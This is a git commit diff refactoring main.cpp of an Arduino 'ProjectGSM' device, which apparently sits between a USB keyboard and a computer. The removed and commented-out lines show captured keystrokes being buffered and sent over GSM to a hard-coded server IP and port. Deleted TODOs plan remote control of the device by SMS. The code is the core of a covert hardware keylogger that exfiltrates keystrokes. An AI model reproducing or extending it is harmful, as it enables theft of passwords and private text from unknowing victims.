72863ee9d5b8f4ad1d5d64ab2bc3dba585459032
Ilya <piccadillable@gmail.com>
2017-03-27 10:20:51 +0300

    full refactoring

--- ProjectGSM/src/main.cpp
+++ ProjectGSM/src/main.cpp
@@ -1,35 +1,23 @@
 // ============================================================================
-#include "gsm.h"
-#include "keyboard.h"
+#include "./includes/core/controller.h"
 // ============================================================================
-SoftwareGSM *gsm;
+SoftwareGSM *gsm_module;
 // ============================================================================
 USB usb;
 HIDBoot<USB_HID_PROTOCOL_KEYBOARD> hid_keyboard(&usb);
 KeyboardParser keyboard_prs;
-const uint8_t MAX_BUFFER_SIZE = 10;
-// ============================================================================
-void traffic_analyze(SoftwareGSM *gsm_module) {
-	if (keyboard_prs.buffer.length() >= MAX_BUFFER_SIZE) {
-		Keyboard.releaseAll();
-		gsm_module->send_answer(keyboard_prs.buffer);
-		Serial.print(F("[GSM] SEND: "));
-		Serial.println(keyboard_prs.buffer.c_str());
-		keyboard_prs.buffer = "";
-	}
-}
 // ============================================================================
 void setup() {
 	Serial.begin(DEFAULT_SERIAL_PORT);
 	digitalWrite(DEFUALT_POWER_PIN, HIGH);
 
-	gsm = new SoftwareGSM();
-	gsm->cfg();
-	gsm->connect_to_server(FF(F("31.207.78.188")), FF(F("8082")));
-
-    Keyboard.begin();
+	Keyboard.begin();
 	if (usb.Init() == -1) Serial.println(F("[ERROR] OSC did not start."));
 	hid_keyboard.SetReportParser(0, &keyboard_prs);
+
+	gsm_module = new SoftwareGSM();
+	// gsm->cfg();
+	// gsm->connect_to_server(FF(F("31.207.78.188")), FF(F("8082")));
 
 	Serial.println(F("[GSM] module started."));
 	viewFreeMemory();
@@ -38,13 +26,7 @@ void setup() {
 }
 // ============================================================================
 void loop() {
-	traffic_analyze(gsm);
-	gsm->execute();
+	ModulesControl::execute(gsm_module, &keyboard_prs);
 	usb.Task();
-
-	// TODO: реализовать удаленный контроль модуля через смс.
-	// (перезапуск, немедленная отправка данных, ответ на смс)
-	// TODO: реализовать возможность подключения к серверу через смс
-	// (отправка текста с ключ. словом и айпи адресом)
 }
 // ============================================================================
